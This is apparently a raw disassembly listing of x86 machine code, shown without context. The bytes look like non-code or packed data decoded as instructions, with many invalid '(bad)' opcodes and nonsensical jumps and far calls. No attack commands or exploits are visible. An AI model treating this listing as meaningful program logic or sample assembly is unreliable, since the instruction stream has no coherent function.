  43f577:	cmp    eax,0x9c2bccff
  43f57c:	pop    es
  43f57d:	add    DWORD PTR [eax],0xffffff91
  43f580:	mov    DWORD PTR [ebx-0x7c3dfff7],eax
  43f586:	dec    esp
  43f587:	add    BYTE PTR [eax],0x83
  43f58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f58b:	outs   dx,BYTE PTR ds:[esi]
  43f58c:	cdq    
  43f58d:	add    BYTE PTR [ebx-0x5dff00a0],al
  43f593:	inc    DWORD PTR [edi+edi*8+0x1a]
  43f597:	pop    ecx
  43f598:	or     DWORD PTR [ecx-0xd0b8c8],0x0
  43f59f:	cld    
  43f5a0:	add    BYTE PTR [ebx+0x3d839d],al
  43f5a6:	sub    edi,DWORD PTR [ebx-0x34]
  43f5a9:	call   FWORD PTR [esi+0xff187a]
  43f5af:	sub    eax,0xff60ffff
  43f5b4:	dec    eax
  43f5b5:	call   DWORD PTR [edi+ecx*1+0xebeff00]
  43f5bc:	ins    DWORD PTR es:[edi],dx
  43f5bd:	mov    edi,edi
  43f5bf:	sbb    BYTE PTR [ebx+0x5100baff],al
  43f5c5:	dec    DWORD PTR [edi+edx*1-0x47800000]
  43f5cc:	fild   DWORD PTR [eax]
  43f5ce:	mov    esp,esi
  43f5d0:	inc    DWORD PTR [eax]
  43f5d2:	mov    edi,0x110040ff
  43f5d7:	cmp    edi,edi
  43f5d9:	(bad)  
  43f5da:	ds inc esi
  43f5dc:	sbb    eax,0x83600000
  43f5e1:	dec    DWORD PTR [edi+0x0]
  43f5e4:	and    al,0xcc
  43f5e6:	cwde   
  43f5e7:	inc    esp
  43f5e8:	add    BYTE PTR [eax],al
  43f5ea:	pop    edx
  43f5eb:	xchg   esi,eax
  43f5ec:	stc    
  43f5ed:	(bad)  
  43f5ee:	push   DWORD PTR [ebp-0x1]
  43f5f1:	push   ebx
  43f5f3:	adc    ebp,0xffffffff
  43f5f6:	jno    0x43f5ae
  43f5f8:	add    bh,bh
  43f5fa:	je     0x43f582
  43f5fc:	test   BYTE PTR [eax],0xff
  43f5ff:	fadd   QWORD PTR [ebx+0x33001289]
  43f605:	add    DWORD PTR [edx-0x62007cf0],0xffffffb0
  43f60c:	mov    dh,0x83
  43f60e:	cmp    DWORD PTR [edi],0xffffffff
  43f611:	int3   
  43f612:	ror    DWORD PTR [ecx+0xaa8ffc1],cl
  43f618:	(bad)  
  43f619:	inc    DWORD PTR [edi-0x7c00ccaa]
  43f61f:	and    eax,DWORD PTR [eax]
  43f621:	push   DWORD PTR [edi]
  43f623:	(bad)  
  43f624:	out    dx,al
  43f625:	add    BYTE PTR [eax],ch
  43f627:	jg     0x43f628
  43f629:	add    BYTE PTR [edx],ah
  43f62b:	or     DWORD PTR [ebx],eax
  43f62d:	dec    DWORD PTR [ecx-0x2d333313]
  43f633:	jmp    FWORD PTR [edx-0x7631ba00]
  43f639:	add    BYTE PTR [eax],ch
  43f63b:	adc    dh,dl
  43f63d:	mov    DWORD PTR [ebx-0x3700ff58],eax
  43f643:	mov    DWORD PTR [edi+0x6b1cff],ecx
  43f649:	sub    DWORD PTR [ebx],0xffffff89
  43f64c:	sti    
  43f64d:	(bad)  
  43f64e:	call   FWORD PTR [edx]
  43f650:	inc    DWORD PTR [eax]
  43f652:	xor    ecx,DWORD PTR [ecx+0x3fe5ffe4]
  43f658:	add    DWORD PTR [eax],0xffffffe0
  43f65b:	or     al,0xc
  43f65d:	add    BYTE PTR [eax],al
  43f65f:	fdivp  st(7),st
  43f661:	int3   
  43f662:	(bad)  
  43f664:	adc    eax,0x89f734ff
  43f669:	push   DWORD PTR [esi+esi*8-0x6800768a]
  43f670:	(bad)  
  43f671:	call   FWORD PTR [ecx-0x35ffff34]
  43f677:	retf   
  43f678:	(bad)  
  43f679:	jmp    FWORD PTR ds:0x83897633
  43f67f:	inc    ebx
  43f680:	(bad)  
  43f681:	jmp    DWORD PTR [eax+eax*1+0x48]
  43f685:	call   FWORD PTR [edi-0x52]
  43f688:	(bad)  
  43f689:	(bad)  
  43f68a:	cld    
  43f68b:	and    eax,0xcffff72
  43f690:	or     DWORD PTR [ecx-0xe0009b],0x74
  43f697:	cmp    bh,bh
  43f699:	add    BYTE PTR [edi+ebx*1],ch
  43f69c:	mov    dl,0xff
  43f69e:	add    BYTE PTR [ebx-0x7cbe0100],al
  43f6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f6a5:	dec    DWORD PTR [eax+ecx*8+0x0]
  43f6a9:	add    al,ah
  43f6ab:	out    dx,eax
  43f6ac:	arpl   WORD PTR [ebx+0xa200],ax
  43f6b2:	pop    ds
  43f6b3:	(bad)  
  43f6b4:	fisttp QWORD PTR [ecx-0x3c92]
  43f6ba:	sbb    BYTE PTR [edx-0x58003356],bh
  43f6c0:	add    bh,bh
  43f6c2:	mov    ds:0x31007fff,al
  43f6c7:	mov    ds:0xe58b0000,al
  43f6cc:	sar    bh,0x83
  43f6cf:	arpl   WORD PTR [eax],ax
  43f6d1:	push   ecx
  43f6d3:	dec    DWORD PTR [ecx-0xb06001]
  43f6d9:	add    BYTE PTR [ecx],dh
  43f6db:	mov    bh,0x6f
  43f6dd:	add    BYTE PTR [ecx+0xa00ff8b],cl
  43f6e3:	call   FWORD PTR [edx+0xa518ff]
  43f6e9:	cmp    DWORD PTR [ebp-0x53],0xffffffe4
  43f6ed:	cmp    edi,0x4a
  43f6f0:	mov    DWORD PTR [eax],eax
  43f6f2:	mov    edx,0x1900dbff
  43f6f7:	sbb    edi,edi
  43f6f9:	jmp    esp
  43f6fb:	jmp    0x43f691
  43f6fd:	add    bh,bh
  43f6ff:	adc    eax,0x6ff00
  43f704:	mov    bl,0x83
  43f706:	xchg   ecx,eax
  43f707:	and    bh,bh
  43f709:	and    DWORD PTR [esi],0x44
  43f70c:	mov    edi,edi
  43f70e:	jmp    FWORD PTR [edx]
  43f710:	cmp    edi,0xffffff9b
  43f713:	add    BYTE PTR [esi+0x0],dl
  43f716:	mov    fs,WORD PTR [ebx-0x1ee6ff7d]
  43f71c:	imul   edi,edi,0x898354ff
  43f722:	or     BYTE PTR [eax],al
  43f724:	mov    edi,0xcc5b58ff
  43f729:	call   FWORD PTR [edi-0x33006327]
  43f72f:	dec    esp
  43f730:	inc    DWORD PTR [eax]
  43f732:	stos   DWORD PTR es:[edi],eax
  43f733:	mov    DWORD PTR [ebp+0x21ed00],eax
  43f739:	adc    esp,0xffffffac
  43f73c:	out    0x83,eax
  43f73e:	dec    DWORD PTR [eax+eax*1]
  43f741:	sub    DWORD PTR [ebx+0x25ff5dff],0xffffffa6
  43f748:	add    DWORD PTR [eax],0x78
  43f74b:	mov    ebp,0x8f00ffa1
  43f750:	(bad)  
  43f751:	(bad)  
  43f752:	out    dx,al
  43f753:	add    ch,al
  43f755:	(bad)  
  43f756:	clc    
  43f757:	xor    bh,bh
  43f759:	call   DWORD PTR [edi]
  43f75b:	jb     0x43f7c6
  43f75d:	inc    DWORD PTR [eax]
  43f75f:	sar    bh,cl
  43f761:	mov    esi,edx
  43f763:	push   DWORD PTR [eax-0x1]
  43f766:	and    DWORD PTR [edi-0x34],edx
  43f769:	add    BYTE PTR [eax+0xff3f92],dl
  43f76f:	(bad)  
  43f770:	(bad)  
  43f771:	call   FWORD PTR [ebx]
  43f773:	and    DWORD PTR [edi+edi*8-0x76339a6c],0xffffffdc
  43f77b:	dec    ebp
  43f77c:	adc    al,0x0
  43f77e:	add    BYTE PTR [ebx+eax*4-0x147cb101],ah
  43f785:	dec    DWORD PTR [edi]
  43f787:	jg     0x43f70c
  43f789:	add    al,cl
  43f78b:	mov    BYTE PTR [eax-0xf03400],cl
  43f791:	jmp    DWORD PTR [esi-0x7d]
  43f794:	retf   
  43f795:	inc    ebp
  43f797:	cmp    edi,0x30116083
  43f79d:	add    bh,bh
  43f79f:	pusha  
  43f7a0:	int3   
  43f7a1:	dec    DWORD PTR [eax+0x48006800]
  43f7a7:	lods   eax,DWORD PTR ds:[esi]
  43f7a8:	mov    DWORD PTR [eax],eax
  43f7aa:	add    eax,0x89fff7ca
  43f7af:	cwde   
  43f7b0:	add    BYTE PTR [eax],al
  43f7b2:	dec    esp
  43f7b3:	(bad)  
  43f7b4:	out    dx,eax
  43f7b5:	add    BYTE PTR [esi+ecx*2-0x58e47d00],al
  43f7bc:	push   0x833b00ff
  43f7c1:	(bad)  
  43f7c2:	cmp    bh,bh
  43f7c4:	iret   
  43f7c5:	mov    DWORD PTR [ecx],eax
  43f7c7:	das    
  43f7c8:	add    BYTE PTR [eax],al
  43f7ca:	pop    edx
  43f7cb:	xor    al,0xfb
  43f7cd:	inc    DWORD PTR [eax]
  43f7cf:	out    0x0,al
  43f7d1:	(bad)  
  43f7d2:	(bad)  
  43f7d3:	inc    DWORD PTR [ebx+0x7c2b00]
  43f7d9:	(bad)  
  43f7da:	mov    ebp,0x83ff08f1
  43f7df:	mov    edx,0xffc500ff
  43f7e4:	push   ss
  43f7e5:	call   FWORD PTR [edi-0x49000013]
  43f7eb:	adc    ebx,DWORD PTR [ecx-0x1]
  43f7ee:	inc    DWORD PTR [ebp-0x1]
  43f7f1:	(bad)  
  43f7f2:	cmp    edi,edi
  43f7f4:	inc    ebx
  43f7f5:	push   DWORD PTR [ebp-0x2d33ff23]
  43f7fb:	repnz sub eax,DWORD PTR [eax]
  43f7fe:	add    BYTE PTR [esp+ecx*8],cl
  43f801:	int3   
  43f802:	cmp    bh,0x49
  43f805:	push   DWORD PTR [edi]
  43f807:	xlat   BYTE PTR ds:[ebx]
  43f808:	add    DWORD PTR [ebx-0x330c71ec],0xffffffff
  43f80f:	jl     0x43f811
  43f811:	jmp    FWORD PTR [edi+0x3ff7fff]
  43f817:	(bad)  
  43f818:	(bad)  
  43f819:	call   FWORD PTR [edx-0x33f2d5]
  43f81f:	sar    edi,0xff
  43f822:	ud0    edi,DWORD PTR [eax+eax*1]
  43f826:	sub    edx,ebx
  43f828:	mov    edi,edi
  43f82a:	xchg   BYTE PTR [esi],cl
  43f82c:	push   ds
  43f82d:	int3   
  43f82e:	(bad)  
  43f82f:	jmp    0xffed:0xff5883ff
  43f836:	cli    
  43f837:	or     edi,edi
  43f839:	sbb    DWORD PTR [edi],0xffffffb2
  43f83c:	pop    ds
  43f83d:	int3   
  43f83e:	int3   
  43f83f:	fld    DWORD PTR [eax]
  43f841:	call   DWORD PTR [eax-0x1]
  43f844:	fdivr  st,st(7)
  43f846:	in     eax,0xf0
  43f848:	add    bh,bh
  43f84a:	scas   eax,DWORD PTR es:[edi]
  43f84b:	jmp    0x43f7e9
  43f84d:	(bad)  
  43f84e:	jmp    edx
  43f850:	(bad)  
  43f851:	jmp    DWORD PTR [edx]
  43f853:	jmp    FWORD PTR [edi-0x77]
  43f856:	out    0x7c,al
  43f858:	(bad)  
  43f859:	jmp    FWORD PTR [ecx-0x6e]
  43f85c:	fadd   DWORD PTR [eax]
  43f85e:	add    BYTE PTR [ecx-0x1],ah
  43f861:	int3   
  43f862:	jns    0x43f7e7
  43f864:	mov    dl,0x0
  43f866:	and    ch,BYTE PTR ds:0x6642ff89
  43f86c:	jbe    0x43f7f1
  43f86e:	(bad)  
  43f86f:	cmp    al,0xcc
  43f871:	add    BYTE PTR [ebx-0x1],dh
  43f874:	out    0x89,eax
  43f876:	(bad)  
  43f877:	out    dx,al
  43f878:	inc    DWORD PTR [eax]
  43f87a:	push   ebx
  43f87b:	sar    BYTE PTR [edi],cl
  43f87d:	add    DWORD PTR [eax],0x4f
  43f880:	int3   
  43f881:	inc    DWORD PTR [eax-0x1]
  43f884:	adc    ah,cl
  43f886:	lea    edi,[edi-0x61b1ff01]
  43f88c:	xchg   ebp,eax
  43f88d:	mov    DWORD PTR [ecx+0x5100ff59],ecx
  43f893:	add    BYTE PTR [ecx+0x0],dl
  43f896:	repz repnz dec esp
  43f89a:	loope  0x43f89a
  43f89c:	pusha  
  43f89d:	mov    edi,edi
  43f89f:	add    bh,bh
  43f8a1:	dec    DWORD PTR [ebp-0x74ffe401]
  43f8a7:	cmp    edi,0x8c89d300
  43f8ad:	cmp    edi,0xfffffff9
  43f8b0:	or     esp,0xffffff86
  43f8b3:	(bad)  
  43f8b4:	fmul   st(4),st
  43f8b6:	inc    esp
  43f8b7:	clc    
  43f8b8:	add    BYTE PTR [ebx+0x9b4b0c],al
  43f8be:	dec    DWORD PTR [esi-0x7d]
  43f8c1:	jmp    DWORD PTR [edi+edi*8-0x483a7c2d]
  43f8c8:	add    BYTE PTR [ecx-0x20693b],cl
  43f8ce:	mov    DWORD PTR [edx-0x1],esp
  43f8d1:	dec    eax
  43f8d3:	(bad)  
  43f8d4:	mov    eax,0xffc2d000
  43f8d9:	add    bl,ah
  43f8db:	pop    es
  43f8dc:	aas    
  43f8dd:	inc    DWORD PTR [eax]
  43f8df:	xlat   BYTE PTR ds:[ebx]
  43f8e0:	add    DWORD PTR [ebx+0x8c008b],0x6
  43f8e7:	sti    
  43f8e8:	add    BYTE PTR [ecx-0xee007b],cl
  43f8ee:	add    BYTE PTR [ecx+ecx*4-0x66009501],bl
  43f8f5:	jmp    FWORD PTR [ebx]
  43f8f7:	(bad)  
  43f8f8:	add    ah,cl
  43f8fa:	and    al,0xb9
  43f8fc:	inc    eax
  43f8fd:	add    BYTE PTR [eax],al
  43f8ff:	xchg   ah,cl
  43f901:	add    BYTE PTR [ebx+eax*4+0x243ccc4b],bh
  43f908:	(bad)  
  43f909:	dec    DWORD PTR [eax+0xffef32]
  43f90f:	xchg   esi,eax
  43f910:	add    DWORD PTR [eax],0xffffff98
  43f913:	add    DWORD PTR [edi],0xffffffff
  43f916:	cmove  eax,DWORD PTR [ebx-0x5cb56300]
  43f91d:	add    BYTE PTR [ebx+0x1eff837f],al
  43f923:	add    bl,bl
  43f925:	add    ah,bl
  43f927:	imul   edi,edi,0x0
  43f92a:	push   ebx
  43f92b:	dec    edi
  43f92c:	and    eax,0x6200cc
  43f931:	call   DWORD PTR [esi-0x1]
  43f934:	jp     0x43f935
  43f936:	push   edi
  43f937:	jge    0x43f939
  43f939:	mov    DWORD PTR [ecx-0x7cffb79a],eax
  43f93f:	jge    0x43f90d
  43f941:	dec    DWORD PTR [ecx]
  43f943:	add    al,dl
  43f945:	call   DWORD PTR [ebx+0x52cc0065]
  43f94b:	mov    edi,DWORD PTR [eax+eax*1-0x1]
  43f94f:	sar    edi,1
  43f951:	(bad)  
  43f952:	fdiv   st(7),st
  43f954:	into   
  43f955:	int3   
  43f956:	scas   eax,DWORD PTR es:[edi]
  43f957:	sub    edi,edi
  43f959:	add    BYTE PTR [esi],bl
  43f95b:	clc    
  43f95c:	aam    0xff
  43f95e:	add    ah,cl
  43f960:	add    bh,bh
  43f962:	jl     0x43f964
  43f964:	mov    al,ds:0xf6b9ff
  43f969:	jmp    DWORD PTR [edx-0x18]
  43f96c:	adc    edi,edi
  43f96e:	call   DWORD PTR [ebx+0x7700ff]
  43f974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f975:	(bad)  
  43f976:	jge    0x43f8ff
  43f978:	inc    DWORD PTR [ebx-0x7ce6088b]
  43f97e:	add    BYTE PTR [edx-0x2cff01],dh
  43f984:	jge    0x43f952
  43f986:	shl    bh,cl
  43f988:	mov    DWORD PTR [eax],eax
  43f98a:	repnz sub BYTE PTR ds:0x8386ff00,0x0
  43f992:	idiv   bh
  43f994:	mov    edx,0x3dfe00
  43f999:	add    BYTE PTR [edi+0x30],bh
  43f99c:	xlat   BYTE PTR ds:[ebx]
  43f99d:	or     esp,0xffffff8a
  43f9a0:	inc    DWORD PTR [eax]
  43f9a2:	ret    0x3cff
  43f9a5:	add    BYTE PTR ds:0x8b00cc3b,bh
  43f9ab:	xlat   BYTE PTR ds:[ebx]
  43f9ac:	(bad)  
  43f9ad:	(bad)  
  43f9ae:	push   DWORD PTR [ecx-0x1]
  43f9b1:	(bad)  
  43f9b2:	cld    
  43f9b3:	inc    edi
  43f9b5:	inc    DWORD PTR [edi]
  43f9b7:	data16 add BYTE PTR [ebx-0x33cd92f2],al
  43f9be:	dec    edi
  43f9c0:	(bad)  
  43f9c1:	dec    DWORD PTR [edi-0x1a333601]
  43f9c7:	in     al,dx
  43f9c8:	dec    esp
  43f9ca:	inc    ecx
  43f9cb:	or     DWORD PTR [edi],esi
  43f9cd:	mov    DWORD PTR [eax],eax
  43f9cf:	sbb    DWORD PTR [eax],eax
  43f9d1:	add    bh,cl
  43f9d3:	call   DWORD PTR [edi+edi*8-0x1a]
  43f9d7:	sbb    al,0x83
  43f9d9:	jmp    DWORD PTR [ebx]
  43f9db:	pop    edi
  43f9dc:	das    
  43f9dd:	add    BYTE PTR [eax],al
  43f9df:	mov    bh,bh
  43f9e1:	int3   
  43f9e2:	mov    dl,0x89
  43f9e4:	add    bh,bh
  43f9e6:	shl    bh,cl
  43f9e8:	add    DWORD PTR [ebx+0x226063],0xffffffff
  43f9ef:	inc    DWORD PTR fs:[eax]
  43f9f2:	das    
  43f9f3:	add    BYTE PTR [edx-0x1],bh
  43f9f6:	or     ebp,ecx
  43f9f8:	inc    DWORD PTR [eax]
  43f9fa:	data16 arpl WORD PTR [edi-0x1],si
  43f9fe:	add    BYTE PTR [esi-0x34],cl
  43fa01:	jmp    FWORD PTR [ecx]
  43fa03:	int3   
  43fa04:	mov    esi,0xffcab600
  43fa09:	call   FWORD PTR [ecx-0x7e]
  43fa0c:	xchg   edx,eax
  43fa0d:	(bad)  
  43fa0e:	inc    DWORD PTR [esi]
  43fa10:	inc    DWORD PTR [eax]
  43fa12:	fld    DWORD PTR [ebx+0x37df0045]
  43fa18:	add    BYTE PTR [ecx-0x7c60e611],cl
  43fa1e:	add    BYTE PTR [ecx-0x7d],bh
  43fa21:	sub    DWORD PTR [ebx],0xffffff89
  43fa24:	ud0    edx,DWORD PTR [ecx-0x470000e7]
  43fa2b:	dec    ebp
  43fa2c:	mov    bh,0x0
  43fa2e:	sub    DWORD PTR [edi+edi*8+0x0],0xffffff8d
  43fa33:	jmp    FWORD PTR [esp+ecx*8]
  43fa36:	sub    dh,dh
  43fa38:	(bad)  
  43fa39:	jmp    DWORD PTR [ecx-0x4b6a]
  43fa3f:	(bad)  
  43fa41:	add    BYTE PTR [ebp+0x0],dl
  43fa44:	aaa    
  43fa45:	add    BYTE PTR [ecx],bl
  43fa47:	jl     0x43fa48
  43fa49:	add    BYTE PTR [ebp-0xb0de],dh
  43fa4f:	mov    edi,0x7affff
  43fa54:	std    
  43fa55:	add    BYTE PTR [ecx-0x1300ff92],cl
  43fa5b:	sub    al,0x45
  43fa5d:	add    BYTE PTR [eax],al
  43fa5f:	ror    ah,1
  43fa61:	call   FWORD PTR [ecx-0x21ffe700]
  43fa67:	lock (bad) 
  43fa69:	call   FWORD PTR [ebx-0x4a]
  43fa6c:	pop    esi
  43fa6d:	(bad)  
  43fa6e:	(bad)  
  43fa6f:	cmp    eax,0x89d9ff00
  43fa74:	push   edx
  43fa75:	add    BYTE PTR [ecx+0x3c],bl
  43fa78:	inc    DWORD PTR [eax]
  43fa7a:	jmp    0xffc9:0x832c7f
  43fa81:	(bad)  
  43fa82:	fld    DWORD PTR [eax]
  43fa84:	inc    ebx
  43fa85:	call   ebp
  43fa87:	cmp    edi,edi
  43fa89:	(bad)  
  43fa8a:	(bad)  [ebx+ecx*8+0x0]
  43fa8e:	call   DWORD PTR [ebx-0xe30001]
  43fa94:	xchg   ecx,eax
  43fa95:	call   FWORD PTR [ecx]
  43fa97:	loop   0x43fa99
  43fa99:	int3   
  43fa9a:	or     DWORD PTR [ecx+0xf83ffb2],0xffffffff
  43faa1:	jmp    DWORD PTR [ebp-0x1]
  43faa4:	cmp    edi,edi
  43faa6:	cmp    eax,0x8ffccab
  43faab:	adc    BYTE PTR [ebx-0xd9ff01],cl
  43fab1:	jmp    FWORD PTR [ebx-0x7d]
  43fab4:	add    DWORD PTR [ecx-0x7c00981d],ecx
  43faba:	js     0x43fb0b
  43fabc:	cmp    eax,0x837600ff
  43fac1:	add    DWORD PTR [ebp+0x25006eff],0x1f
  43fac8:	dec    DWORD PTR [ecx-0x55e5f2]
  43face:	mov    eax,esp
  43fad0:	mov    edi,edi
  43fad2:	jns    0x43fad3
  43fad4:	add    DWORD PTR [eax],0x4b
  43fad7:	push   0x581800ff
  43fadc:	pushf  
  43fadd:	int3   
  43fade:	push   DWORD PTR [ebx-0x1]
  43fae1:	int3   
  43fae2:	sub    esp,ecx
  43fae4:	cmp    eax,0xff117d83
  43fae9:	xor    edx,0x2b
  43faec:	fld    QWORD PTR [eax]
  43faee:	dec    DWORD PTR [edi+edi*8+0x0]
  43faf2:	les    eax,FWORD PTR [eax]
  43faf4:	test   DWORD PTR [ebx-0x7cff1ffb],eax
  43fafa:	add    al,cl
  43fafc:	push   ecx
  43fafd:	add    bh,bh
  43faff:	pop    ebx
  43fb00:	add    BYTE PTR [eax],al
  43fb02:	(bad)  
  43fb04:	sahf   
  43fb05:	inc    DWORD PTR [esp+ecx*1-0x34]
  43fb09:	mov    DWORD PTR [eax-0x40],esi
  43fb0c:	js     0x43fb0d
  43fb0e:	and    DWORD PTR [esi-0x1],0xffffff83
  43fb12:	add    eax,DWORD PTR [eax]
  43fb14:	repnz int3 
  43fb16:	xor    DWORD PTR [esi-0x1],ebp
  43fb19:	add    BYTE PTR [ecx+0x7b],dh
  43fb1c:	mov    ds:0x89e9ff00,al
  43fb21:	dec    DWORD PTR [esi]
  43fb23:	int3   
  43fb24:	jge    0x43fb26
  43fb26:	dec    esp
  43fb27:	adc    al,0x0
  43fb29:	mov    DWORD PTR [eax-0x7cc5be],esp
  43fb2f:	or     eax,0xff2f0000
  43fb34:	jle    0x43fb35
  43fb36:	ret    
  43fb37:	nop
  43fb38:	add    bh,bh
  43fb3a:	mov    ebx,DWORD PTR [ebx+0x6e]
  43fb3d:	add    ah,cl
  43fb3f:	fwait
  43fb40:	mov    edi,edi
  43fb42:	outs   dx,DWORD PTR ds:[esi]
  43fb43:	push   DWORD PTR [ecx+0x985eff]
  43fb49:	call   FWORD PTR [esi+0x2b4d]
  43fb4f:	xor    al,BYTE PTR [eax]
  43fb51:	int3   
  43fb52:	add    eax,0x72891d00
  43fb57:	rol    DWORD PTR [eax],cl
  43fb59:	xor    DWORD PTR [ebx+ebx*8+0x73],0xffffff89
  43fb5e:	jmp    edi
  43fb60:	mov    DWORD PTR [eax],eax
  43fb62:	mov    dh,0x0
  43fb64:	inc    edi
  43fb65:	dec    DWORD PTR [ebx]
  43fb67:	iret   
  43fb68:	add    BYTE PTR [ebx+0x5accf6],al
  43fb6e:	add    BYTE PTR [ebx-0xf10077],al
  43fb74:	or     esp,0xff001a8b
  43fb7a:	int    0x7c
  43fb7c:	cmp    di,0xffd8
  43fb80:	inc    DWORD PTR [eax]
  43fb82:	pop    es
  43fb83:	dec    DWORD PTR [edx-0x7d]
  43fb86:	pushf  
  43fb87:	(bad)  
  43fb89:	cmp    DWORD PTR ds:0x4ee9,0xffffffe7
  43fb90:	cmp    edi,0x6e
  43fb93:	jmp    FWORD PTR [edi-0x1]
  43fb96:	pop    ecx
  43fb97:	ins    DWORD PTR es:[edi],dx
  43fb98:	inc    DWORD PTR [eax]
  43fb9a:	repz shl DWORD PTR [esi+0xa78900],1
  43fba1:	int3   
  43fba2:	xor    bh,bh
  43fba4:	pop    edx
  43fba5:	inc    DWORD PTR [edx+0x7900ff83]
  43fbab:	in     eax,0x7d
  43fbad:	inc    DWORD PTR [ebx+0x1000007f]
  43fbb3:	sbb    DWORD PTR [edi-0x34],0x3b
  43fbb7:	push   eax
  43fbb8:	inc    DWORD PTR [eax]
  43fbba:	fidiv  WORD PTR [edx+0x38]
  43fbbd:	inc    DWORD PTR [eax]
  43fbbf:	inc    esi
  43fbc0:	add    bh,bh
  43fbc2:	sub    bh,bh
  43fbc4:	test   eax,0xff1d08ff
  43fbc9:	add    BYTE PTR [esi-0xff7928],dh
  43fbcf:	imul   edi,edi,0x8eff2800
  43fbd5:	add    dh,bl
  43fbd7:	inc    eax
  43fbd8:	int3   
  43fbd9:	add    BYTE PTR [eax-0x76003f23],bh
  43fbdf:	mov    WORD PTR [eax],es
  43fbe1:	cmp    esp,0x0
  43fbe4:	push   esi
  43fbe5:	(bad)  
  43fbe6:	out    dx,al
  43fbe7:	test   BYTE PTR [ebx-0x7e556d7d],0xff
  43fbee:	(bad)  
  43fbef:	stc    
  43fbf0:	inc    DWORD PTR [eax]
  43fbf2:	add    BYTE PTR ds:0x7283,dh
  43fbf7:	mov    cl,0xff
  43fbf9:	inc    DWORD PTR [ecx]
  43fbfb:	cmc    
  43fbfc:	inc    ebx
  43fbfd:	add    BYTE PTR [eax],al
  43fbff:	ins    BYTE PTR es:[edi],dx
  43fc00:	dec    DWORD PTR [ecx-0x430083]
  43fc06:	(bad)  
  43fc07:	inc    edx
  43fc08:	add    BYTE PTR [eax],al
  43fc0a:	cli    
  43fc0b:	lea    eax,[ecx-0x9f0001]
  43fc11:	add    BYTE PTR [edi+0x0],ah
  43fc14:	pop    eax
  43fc15:	add    BYTE PTR [esi+ecx*4],cl
  43fc18:	inc    DWORD PTR [eax]
  43fc1a:	pop    edi
  43fc1b:	pop    ds
  43fc1c:	adc    bh,bh
  43fc1e:	mov    ebx,edi
  43fc20:	mov    edi,edi
  43fc22:	mov    ah,0xff
  43fc24:	jne    0x43fc25
  43fc26:	cmp    eax,0x44ff83ec
  43fc2b:	out    dx,eax
  43fc2c:	cmc    
  43fc2d:	int3   
  43fc2e:	int3   
  43fc2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fc30:	inc    DWORD PTR [eax]
  43fc32:	es add bh,al
  43fc35:	add    BYTE PTR [eax+esi*8+0x595183ff],ah
  43fc3c:	adc    BYTE PTR [ebx+0xff00ff],al
  43fc42:	idiv   bh
  43fc44:	loope  0x43fc46
  43fc46:	sub    bl,BYTE PTR [ebx-0x67cdff7d]
  43fc4c:	jp     0x43fc4e
  43fc4e:	mov    DWORD PTR [ecx-0x77ff01],ecx
  43fc54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fc55:	(bad)  
  43fc56:	mov    ebx,0x81ff009d
  43fc5b:	adc    eax,0xdb00890d
  43fc60:	or     DWORD PTR [ecx-0xe17c4a],0x31
  43fc67:	jo     0x43fbec
  43fc69:	add    BYTE PTR [ebx],al
  43fc6b:	ret    0x42
  43fc6e:	jmp    FWORD PTR [eax-0x1]
  43fc71:	add    ch,cl
  43fc73:	push   DWORD PTR [esi]
  43fc75:	add    dh,bl
  43fc77:	ds int3 
  43fc79:	jmp    FWORD PTR [edi-0xd791]
  43fc7f:	xchg   esp,eax
  43fc80:	cmp    edi,0xffffffff
  43fc83:	call   eax
  43fc85:	push   DWORD PTR [ebp+ebp*2-0x34]
  43fc89:	adc    DWORD PTR [ecx-0x13],0x3f
  43fc8d:	int3   
  43fc8e:	mov    eax,esi
  43fc90:	(bad)  
  43fc91:	call   FWORD PTR [esp+ecx*8]
  43fc94:	mov    edx,0x897bb3cc
  43fc99:	jmp    FWORD PTR [ecx-0x1]
  43fc9c:	sub    cl,BYTE PTR [ecx-0x769d01]
  43fca2:	adc    edi,edi
  43fca4:	icebp  
  43fca5:	int3   
  43fca6:	lock icebp 
  43fca8:	add    BYTE PTR [eax],al
  43fcaa:	leave  
  43fcab:	call   0xffcc:0x6affff39
  43fcb2:	or     bh,bh
  43fcb4:	mov    ah,0xff
  43fcb6:	inc    esi
  43fcb7:	jo     0x43fcb8
  43fcb9:	add    ch,bl
  43fcbb:	call   0x0:0x6900fff1
  43fcc2:	cmp    eax,0x15ccd2ff
  43fcc7:	cmp    eax,DWORD PTR [eax]
  43fcc9:	push   DWORD PTR [ebx+edi*8+0x2e]
  43fccd:	add    BYTE PTR [eax],al
  43fccf:	aam    0xff
  43fcd1:	dec    ebp
  43fcd3:	dec    DWORD PTR [eax+eax*1-0x2393]
  43fcda:	fcmovnbe st,st(4)
  43fcdc:	xchg   DWORD PTR [ebx+0xff99ff],eax
  43fce2:	dec    ebp
  43fce3:	(bad)  
  43fce4:	(bad)  
  43fce6:	xchg   edx,eax
  43fce7:	sbb    al,0xff
  43fce9:	int3   
  43fcea:	mov    DWORD PTR [edx],ebp
  43fcec:	add    BYTE PTR fs:[ecx-0x40ff00b6],cl
  43fcf3:	(bad)  
  43fcf4:	cmp    bh,bh
  43fcf6:	jb     0x43fd75
  43fcf8:	inc    DWORD PTR [ebx-0xbc1823]
  43fcfe:	add    BYTE PTR [ebp-0x1],dl
  43fd01:	(bad)  
  43fd02:	js     0x43fd03
  43fd04:	mov    ebx,0xffe1dcff
  43fd09:	add    dl,al
  43fd0b:	mov    al,ds:0xe0ff0092
  43fd10:	add    BYTE PTR [ecx-0x7c1c336a],cl
  43fd16:	(bad)  
  43fd18:	add    bh,bh
  43fd1a:	mov    bl,0x93
  43fd1c:	adc    DWORD PTR [eax],eax
  43fd1e:	(bad)  
  43fd1f:	fdiv   st(7),st
  43fd21:	mov    DWORD PTR [ecx-0x747c4101],esi
  43fd27:	arpl   di,di
  43fd29:	inc    DWORD PTR [esi-0x25a7]
  43fd2f:	jmp    0xb:0xf6ffff
  43fd36:	mov    ch,0x70
  43fd38:	add    bh,bh
  43fd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fd3b:	xchg   ecx,eax
  43fd3c:	cmp    edi,0xffffffff
  43fd3f:	fdiv   st(7),st
  43fd41:	dec    DWORD PTR [edi-0x6bffb500]
  43fd47:	dec    esi
  43fd48:	(bad)  
  43fd49:	(bad)  
  43fd4a:	mov    ecx,0xffdd11
  43fd4f:	sar    edi,cl
